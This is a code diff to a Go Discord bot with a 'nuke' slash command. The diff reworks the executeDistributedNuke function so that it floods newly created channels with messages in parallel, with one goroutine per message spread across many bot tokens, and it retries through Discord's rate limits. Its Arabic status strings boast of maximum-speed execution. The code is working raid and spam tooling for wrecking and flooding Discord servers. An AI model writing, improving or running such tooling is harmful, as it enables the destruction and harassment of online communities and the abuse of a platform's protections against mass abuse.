@@ -43,7 +43,7 @@ func main() {
 	cmdNuke := "nuke"
 	commandNuke := &discordgo.ApplicationCommand{
 		Name:        cmdNuke,
-		Description: "nuke server1",
+		Description: "nuke server",
 		Options: []*discordgo.ApplicationCommandOption{
 			{
 				Type:        discordgo.ApplicationCommandOptionString,
@@ -98,7 +98,7 @@ func main() {
 			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
 				Type: discordgo.InteractionResponseChannelMessageWithSource,
 				Data: &discordgo.InteractionResponseData{
-					Content: "⚡ جاري تنفيذ العمليات بالسرعة القصوى والتوزيع الذكي...",
+					Content: "⚡ جاري تنفيذ العمليات بالسرعة القصوى التامة...",
 					Flags:   discordgo.MessageFlagsEphemeral,
 				},
 			})
@@ -329,56 +329,64 @@ func executeDistributedNuke(tokens []string, guildID, botID, roomName string, ro
 	}
 	wgCreate.Wait()
 
-	// د. إرسال الرسائل (باستخدام نظام العمال المستقلين لكل بوت لأقصى سرعة ممكنة وبدون تأخير)
+	// د. إرسال الرسائل (توازي حقيقي 100%: كل رسالة وكل روم في Goroutine مستقل ينطلقون دفعة واحدة معاً)
+	time.Sleep(300 * time.Millisecond)
+
+	if len(newChannelIDs) == 0 {
+		fmt.Println("❌ تنبيه: لم يتم إنشاء أي روم للإرسال!")
+		return
+	}
+
 	var wgMsg sync.WaitGroup
-	for botIdx, token := range tokens {
-		wgMsg.Add(1)
-		go func(t string, bIndex int) {
-			defer wgMsg.Done()
+	for chIdx, chID := range newChannelIDs {
+		for m := 0; m < messagesCount; m++ {
+			wgMsg.Add(1)
 			
-			botClient := &http.Client{
-				Timeout: 5 * time.Second,
-			}
+			tokenIndex := (chIdx * messagesCount) + m
+			token := tokens[tokenIndex%len(tokens)]
 
-			headers := map[string]string{
-				"Authorization": "Bot " + t,
-				"Content-Type":  "application/json",
-				"User-Agent":    "DiscordBot (https://discord.com, v10)",
-			}
+			go func(chIDParam string, t string) {
+				defer wgMsg.Done()
+				
+				botClient := &http.Client{
+					Timeout: 5 * time.Second,
+				}
 
-			for chIdx := bIndex; chIdx < len(newChannelIDs); chIdx += len(tokens) {
-				chIDParam := newChannelIDs[chIdx]
+				headers := map[string]string{
+					"Authorization": "Bot " + t,
+					"Content-Type":  "application/json",
+					"User-Agent":    "DiscordBot (https://discord.com, v10)",
+				}
 
-				for m := 0; m < messagesCount; m++ {
-					for {
-						msgReq, _ := http.NewRequest("POST", "https://discord.com/api/v10/channels/"+chIDParam+"/messages", bytes.NewBuffer(msgPayload))
-						for k, v := range headers {
-							msgReq.Header.Set(k, v)
-						}
+				for {
+					msgReq, _ := http.NewRequest("POST", "https://discord.com/api/v10/channels/"+chIDParam+"/messages", bytes.NewBuffer(msgPayload))
+					for k, v := range headers {
+						msgReq.Header.Set(k, v)
+					}
 
-						msgResp, err := botClient.Do(msgReq)
-						if err != nil {
-							break
-						}
-
-						if msgResp.StatusCode == 429 {
-							retryAfterStr := msgResp.Header.Get("Retry-After")
-							msgResp.Body.Close()
-							if retryAfter, err := strconv.ParseFloat(retryAfterStr, 64); err == nil {
-								time.Sleep(time.Duration(retryAfter*1000)*time.Millisecond + 20*time.Millisecond)
-							} else {
-								time.Sleep(50 * time.Millisecond)
-							}
-							continue
-						}
-						msgResp.Body.Close()
+					msgResp, err := botClient.Do(msgReq)
+					if err != nil {
 						break
 					}
+
+					if msgResp.StatusCode == 429 {
+						retryAfterStr := msgResp.Header.Get("Retry-After")
+						msgResp.Body.Close()
+						if retryAfter, err := strconv.ParseFloat(retryAfterStr, 64); err == nil {
+							time.Sleep(time.Duration(retryAfter*1000)*time.Millisecond + 10*time.Millisecond)
+						} else {
+							time.Sleep(50 * time.Millisecond)
+						}
+						continue
+					}
+					
+					msgResp.Body.Close()
+					break
 				}
-			}
-		}(token, botIdx)
+			}(chID, token)
+		}
 	}
 	wgMsg.Wait()
 
-	fmt.Println("✅ انتهت كافة العمليات بالسرعة القصوى بنجاح!")
+	fmt.Println("✅ انتهت كافة العمليات بالسرعة القصوى التامة بنجاح!")
 }
